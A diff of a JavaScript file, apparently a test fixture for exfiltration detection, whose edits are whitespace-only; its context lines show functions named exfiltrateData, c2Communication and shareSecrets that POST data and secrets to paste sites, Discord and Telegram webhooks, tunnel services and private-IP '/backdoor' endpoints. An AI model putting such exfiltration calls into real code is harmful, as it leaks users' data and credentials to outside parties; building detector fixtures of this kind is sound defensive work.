@@ -8,38 +8,38 @@ const exfiltrateData = (data) => {
         method: 'POST',
         body: data
     });
-    
+
     fetch('https://hastebin.com/documents', {
-        method: 'POST', 
+        method: 'POST',
         body: data
     });
-    
+
     fetch('https://ix.io/', {
         method: 'POST',
         body: data
     });
-    
+
     // Discord webhook exfiltration
     fetch('https://discord.com/api/webhooks/123456/abcdef', {
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({content: data})
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: data })
     });
-    
+
     // Telegram exfiltration
     fetch('https://api.telegram.org/bot123:ABC/sendMessage', {
         method: 'POST',
         body: `chat_id=123&text=${data}`
     });
-    
+
     // Tunnel services
     fetch('https://abc123.ngrok.io/data', {
         method: 'POST',
         body: data
     });
-    
+
     fetch('https://test.localtunnel.me/exfil', {
-        method: 'POST', 
+        method: 'POST',
         body: data
     });
 };
@@ -48,10 +48,10 @@ const exfiltrateData = (data) => {
 const c2Communication = () => {
     const privateIPs = [
         '10.0.1.100:8080',
-        '192.168.2.50:9999', 
+        '192.168.2.50:9999',
         '172.20.0.10:4444'
     ];
-    
+
     privateIPs.forEach(ip => {
         fetch(`http://${ip}/backdoor`, {
             method: 'POST',
@@ -70,14 +70,14 @@ const shareSecrets = (secrets) => {
         method: 'PUT',
         body: secrets
     });
-    
+
     fetch('https://file.io/', {
         method: 'POST',
         body: new FormData().append('file', new Blob([secrets]))
     });
-    
+
     fetch('https://0x0.st/', {
-        method: 'POST', 
+        method: 'POST',
         body: secrets
     });
 };
@@ -88,12 +88,12 @@ const webhookExfil = (data) => {
         method: 'POST',
         body: data
     });
-    
+
     fetch('https://webhook.site/unique-id-here', {
         method: 'POST',
         body: data
     });
-    
+
     fetch('https://beeceptor.com/test-endpoint', {
         method: 'POST',
         body: data
